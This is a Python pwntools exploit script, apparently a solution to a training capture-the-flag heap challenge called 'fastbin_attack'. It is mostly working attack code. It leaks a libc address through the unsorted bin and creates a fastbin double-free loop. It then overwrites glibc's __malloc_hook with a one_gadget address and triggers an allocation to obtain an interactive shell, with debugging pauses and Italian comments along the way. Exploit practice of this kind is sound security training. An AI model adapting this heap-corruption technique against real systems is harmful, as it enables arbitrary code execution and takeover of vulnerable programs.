from pwn import*

r = process("./fastbin_attack")
#r = remote("bin.training.offdef.it", 10101)

gdb.attach(r,
'''
''')

def alloc(size):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline("%d" % size)
    r.recvuntil("index ")
    index = int(r.recvuntil("!")[:-1])
    return index

def write(index, data):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)
    r.recvuntil("Content: ")
    r.send(data)
    r.recvuntil("Done!")

def read(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)
    data = r.recvuntil("\nOptions:")[:-len("\nOptions:")]
    return data

def free(index):
    r.recvuntil("> ")
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)


app = alloc(0x100)
alloc(0x20)
free(app)

leak_libc = u64(read(app) + b"\x00"*2)

offset = 0x3c4b78 #(unsorted bin in gdb - base libc in gdb)

libc_base = leak_libc - offset
# having libc_base we can simply calculate the free_hook or malloc_hook addr.

# i create the loop for the fast bin attack
chunk1 = alloc(0x60)
input("WAIT")
chunk2 = alloc(0x60)
free(chunk1)
input("WAIT")
free(chunk2)
input("WAIT")
free(chunk1)
#print("DOVREI AVER FATTO IL LOOP")
input("WAIT")
chunk_to_overwrite = alloc(0x60)
# Now i have to write into it -> malloc_hook
libc = ELF("./libc-2.23.so")
libc.address = libc_base
m_hook = libc.symbols["__malloc_hook"]
print(hex(m_hook))

# where i have to start to write for overwriting the malloc_hook
offset_for_writing_malloc_hook = 0x23
# ora dentro la testa della fast bin dovrei avere l'indirizzo dove andrò a scrivere.
input("WAIT")
write(chunk_to_overwrite,p64(m_hook - offset_for_writing_malloc_hook))
print("HO SOVRASCRITTO LA TESTA DI FAST BIN")
print(hex(m_hook - offset_for_writing_malloc_hook))

input("WAIT")
alloc(0x60)
input("WAIT")
alloc(0x60)

#print("NE HO ALLOCATI DUE prima della write_gadget")

one_gadget = libc_base + 0xf1247
input("WAIT")
a = alloc(0x60)

#print("ALLOCATO PER SOVRASCRIVERE LA MALLOC")

input("WAIT")
write(a, b"A"*0x13 + p64(one_gadget))

input("WAIT")
r.sendline(b"1")
input("WAIT")
r.sendline("%d" % 0x30)

r.interactive()